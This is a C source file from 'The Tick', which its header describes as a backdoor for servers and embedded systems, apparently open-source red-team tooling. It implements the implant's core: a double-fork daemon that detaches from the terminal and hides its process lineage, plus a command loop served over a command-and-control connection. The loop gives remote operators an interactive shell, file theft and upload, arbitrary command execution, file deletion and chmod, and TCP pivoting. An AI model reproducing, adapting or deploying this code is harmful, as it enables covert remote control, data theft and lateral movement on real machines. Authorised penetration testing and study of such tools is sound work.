/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "command.h"

#include "config.h"
#include "parser.h"
#include "file.h"
#include "shell.h"
#include "dns.h"
#include "pivot.h"
#include "uuid4.h"

#ifndef _WIN32

// Execute the bot as a daemon.
int daemonize(int argc, char *argv[])
{
    // This implements the classic Unix double-fork trick.
    // The main difference is we don't exit the first parent process,
    // since we want the original program to run correctly.
    if (fork() == 0) {

        // Remove ourselves from the process group.
        setpgrp();

        // Prevent a SIGHUP on shell exit by ignoring the signal entirely.
        signal(SIGHUP, SIG_IGN);

        // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
        signal(SIGPIPE, SIG_IGN);

#if ! TICK_VERBOSE

        // Disassociate from the terminal, since we're not using it.
        int fd = open("/dev/tty", O_RDWR);
        if (fd >= 0) {
            ioctl(fd, TIOCNOTTY, 0);
            close(fd);
        }

        // Close all of the parent's files and create new standard
        // input, output and error files pointed to /dev/null.
        struct rlimit rlim;
        memset(&rlim, 0, sizeof(rlim));
        if (getrlimit(RLIMIT_NOFILE, &rlim) == 0 && rlim.rlim_cur > 0) {
            for (fd = 0; fd < (int) rlim.rlim_cur; fd++) close(fd);
            open("/dev/null", O_RDONLY);
            open("/dev/null", O_WRONLY);
            open("/dev/null", O_WRONLY);
        }

#endif

        // Second fork to fully disassociate from the parent process tree.
        // This way we won't even show up on ps as having forked from here.
        if (fork() != 0) exit(0);

        // Execute the daemon's main function.
        return run(argc, argv);
    }

    // This return instruction is only executed on the original process.
    return 0;
}

#endif

// Instance the parser and launch the main command loop.
int run(int argc, char *argv[])
{
    // Prevent a SIGHUP on shell exit by ignoring the signal entirely.
    // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
#ifndef _WIN32
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
#endif

    // Get the configuration for the bot.
    Settings s;
    get_configuration(&s, argc, argv);

    // If we don't have a hostname and port to connect to, quit.
    if (s.hostname[0] == 0 || s.port == 0) {
#if TICK_VERBOSE
        if (argc > 0) {
            show_help(&s, argv[0]);
        } else {
            show_help(&s, NULL);
        }
#endif
        return 1;
    }

    // On Windows, we must initialize the sockets library.
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        LOG("Failed to initialize Windows sockets, error code: %d\n", (int) GetLastError());
        return 0;
    }
#endif

    // Allocate the parser structure.
    // If the parser buffer is small, use the stack.
    // If it's large, use the heap.
#if TICK_PARSER_BUFFER_SIZE > 0x1000
    Parser *p = malloc(TICK_PARSER_BUFFER_SIZE);
    if (p == NULL) return 1;
#else
    Parser parser;
    Parser *p = &parser;
#endif

    // Initialize the parser.
    parser_init(p, &s);

    // Launch the main command loop.
    while (command_loop(p) == 0) {}

    // Free the buffer and quit.
#if TICK_PARSER_BUFFER_SIZE > 0x1000
    free(p);
#endif
    return 0;
}

// Main command loop.
int command_loop(Parser *p)
{
    for (;;) {

        // Wait for the next command and read the command block header.
        // This call will block and reconnect if needed.
        parser_wait(p);

        // Now depending on the command ID we will do a number of things.
        switch (p->header.cmd_id)
        {

        // Just a simple no operation command. Useful for testing.
        case CMD_NOP:
            parser_ok(p);
            break;

        // Kill command. Just kill the current process.
        // Global cleanup will be handled by the atexit routine.
        case CMD_SYSTEM_EXIT:
            LOG("User requested termination.\n");
            parser_ok(p);
            parser_close(p);
            return 1;

        // Fork the bot. This will create a new bot instance with a new UUID.
        case CMD_SYSTEM_FORK:
            do_system_fork(p);
            break;

#if TICK_FEATURES_SHELL

        // Run an interactive shell.
        // This command reuses the C&C connection.
        case CMD_SYSTEM_SHELL:
            do_system_shell(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

#endif
#if TICK_FEATURES_FILE

        // Grab a file from the target machine.
        case CMD_FILE_PULL:
            do_file_pull(p);
            break;

        // Put a file into the target machine.
        case CMD_FILE_PUSH:
            do_file_push(p);
            break;

        // Delete a file in the target machine.
        case CMD_FILE_UNLINK:
            do_file_unlink(p);
            break;

        // Chmod a file in the target machine.
        case CMD_FILE_CHMOD:
            do_file_chmod(p);
            break;

#endif
#if TICK_FEATURES_EXEC

        // Run a non-interactive command and return the response.
        case CMD_FILE_EXEC:
            do_file_exec(p);
            break;

#endif
#if TICK_FEATURES_DNS

        // Domain name resolution.
        case CMD_DNS_RESOLVE:
            do_dns_resolve(p);
            break;

#endif
#if TICK_FEATURES_PIVOT

        // Simple TCP pivot.
        // This command reuses the C&C connection.
        case CMD_TCP_PIVOT:
            do_tcp_pivot(p);
            LOG("Channel reused, reconnecting...\n");
            return 0;

#endif

        // Unsupported command.
        default:
            LOG("Unsupported command: 0x%4x 0x%04x 0x%08x\n", p->header.cmd_id, p->header.cmd_len, p->header.data_len);
            parser_error(p, "not supported");
            break;
        }

        // Skip any unread bytes from the socket until we reach the next command.
        parser_next(p);
    }
}

// Implements the "fork" command.
// Also used internally by other commands.
void do_system_fork(Parser *p)
{

#ifdef _WIN32

    // While there is a curious fork() hack on Windows, I can't seem to get it working well.
    // The processes are forking alright but they can't seem to use sockets afterwards.
    // There are also some oddities in task manager... this could be useful later! >:)
    //
    // Instead, let's just launch a new process, since for this call it's all the same.
    // We will pass the desired UUID value over the command line.

    // Memory buffers for constructing the new command line string.
    char arguments[4096];
    char name[MAX_PATH];
    char uuid_str[39];
    memset(arguments, 0, sizeof(arguments));
    memset(name, 0, sizeof(name));
    memset(uuid_str, 0, sizeof(uuid_str));

    // Generate a new UUID for the new instance.
    unsigned char uuid[16];
    uuid4(uuid);
    uuid_encode(uuid, uuid_str, sizeof(uuid_str));

    // Get the current executable pathname.
    GetModuleFileNameA(NULL, name, MAX_PATH);

    // Get the current command line arguments.
    strncpy(arguments, GetCommandLineA(), sizeof(arguments)-1);

    // Crude detection for previous -u arguments.
    // This should prevent the -u switches from piling up.
    size_t len = strlen(arguments);
    if (len >= 41 && arguments[len-41] == ' ' && arguments[len-40] == '-' && arguments[len-39] == 'u' && arguments[len-38] == ' ') {
        arguments[len-41] = 0;
    }

    // Add a new -u switch at the end with the new UUID.
    strncat(arguments, " -u ", sizeof(arguments)-1);
    strncat(arguments, uuid_str, sizeof(arguments)-1);

    // Launch the new process.
    LOG("Launching new instance of bot. Command line: %s\n", arguments);
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&pi, 0, sizeof(pi));
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(STARTUPINFO);
    if (CreateProcessA(name, arguments, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi) != 0) {
        parser_ok(p);
    } else {
        parser_error(p, "internal error");
    }

#else

    // Generate a new UUID for the new instance.
    unsigned char uuid[16];
    uuid4(uuid);

    // Send the new UUID back to the caller.
    parser_begin_response(p, CMD_STATUS_OK, sizeof(uuid));
    parser_send_block(p, (char *) uuid, sizeof(uuid));

    // Fork the new instance.
    if (fork() == 0) {

        // We are in the child instance now.
        // Set the new UUID into the Parser object.
        memcpy(p->uuid, uuid, sizeof(uuid));

        // Close the socket object and reconnect.
        // Do not shutdown! The parent process still uses this connection.
        close(p->fd);
        p->fd = -1;
        parser_close(p);
        parser_connect(p);
    }

#endif

}

#if TICK_FEATURES_EXEC

// These two functions "should" be in shell.c and file.c respectively.
// But if we do that, we bloat the binary if we only want to exec but not
// do file operations or run an interactive shell.

// Helper function to run a simple command.
int run_simple_command(const char *command, char *buffer, const size_t count)
{
    int success = 0;
    size_t read = 0;
    FILE* file = popen(command, "r");
    if (file != NULL) {
        while (count > read + 1) {
            if (fgets(buffer + read, count - read, file) == NULL) break;
            read = strlen(buffer);
        }
        buffer[read] = 0;
        if (pclose(file) != -1) {
            success = 1;
        }
    }
    return success;
}

// Implements the "exec" command.
void do_file_exec(Parser *p)
{
    char *command = (char *) &p->buffer;
    uint16_t buffer_length = 0;

    // If the buffer is small, use the stack.
    // If it's large, use the heap.
#if TICK_EXEC_BUFFER_SIZE > 0x1000
    char *buffer = malloc(TICK_EXEC_BUFFER_SIZE);
    if (buffer == NULL) {
        parser_error(p, "memory error");
        return;
    }
#else
    char buffer[TICK_EXEC_BUFFER_SIZE];
#endif

    // Get the filename (first argument).
    if (parser_get_first_arg(p) < 0) {
        parser_error(p, "command line too long");
        return;
    } else {

        // Execute the command.
        LOG("Executing: %s\n", command);
        if (run_simple_command(command, (char *) buffer, TICK_EXEC_BUFFER_SIZE)) {
            LOG("Success\n");
            buffer_length = strlen(buffer);
            parser_begin_response(p, CMD_STATUS_OK, buffer_length);
            parser_send_block(p, buffer, buffer_length);
        } else {
            LOG("Error\n");
            parser_error(p, "could not execute");
        }
    }

    // Free the buffer.
#if TICK_EXEC_BUFFER_SIZE > 0x1000
    free(buffer);
#endif
}

#endif
